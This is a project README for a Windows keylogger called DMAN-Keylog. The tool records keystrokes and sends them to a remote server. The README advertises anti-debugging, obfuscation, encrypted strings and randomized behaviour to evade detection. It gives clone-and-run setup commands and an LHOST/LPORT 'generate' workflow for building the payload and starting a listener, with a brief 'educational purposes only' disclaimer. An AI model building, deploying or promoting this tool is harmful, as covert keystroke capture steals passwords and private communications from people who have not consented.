# DMAN-Keylog

DMAN-Keylog is an advanced keylogger for Windows systems, designed for educational and authorized security testing purposes. This tool captures keystrokes and sends them to a remote server for analysis.

## Features

- Dynamic function loading
- String encryption and decryption
- Anti-debugging techniques
- Obfuscation of code
- Randomized behavior to evade detection
- Easy setup with a single script
- Automated server setup

## Installation

### Prerequisites

- Kali Linux or any other Linux distribution
- MinGW-w64
- Python3
- Apache2
- Git
- UPX

### Steps
 **Clone the repository**


   	git clone https://github.com/maneeshaking/DMAN-Keylog.git
   	cd DMAN-Keylog
	dos2unix setup.sh
	chmod +x setup.sh
	./setup.sh
**Usage**
**Options**
When you run the setup.sh script, it displays a banner and provides the following options:

Show options: Display and set the LHOST and LPORT values.
Start server: Start the Python server to receive keystrokes.
Exit: Exit the setup script.

**Setting Options**

To set LHOST, type: set LHOST=<IP_ADDRESS> 
To set LPORT, type: set LPORT=<PORT_NUMBER>
To generate the keylogger, type: generate

Example

	set LHOST=192.168.1.10
	set LPORT=9999
	generate

./setup.sh
Select option 2 to start the server

Exit the script:
./setup.sh
Select option 3 to exit

**Legal Disclaimer**
This tool is intended for educational purposes only and should only be used in environments where you have explicit permission to do so. Misuse of this tool may lead to legal consequences. The author is not responsible for any misuse of this tool.

Contact developer:
https://www.linkedin.com/in/maneesha-dewmine-a34a30203/overlay/about-this-profile/?lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base%3Bmg%2FpdPoVT6m%2FN3pEocSKjw%3D%3D
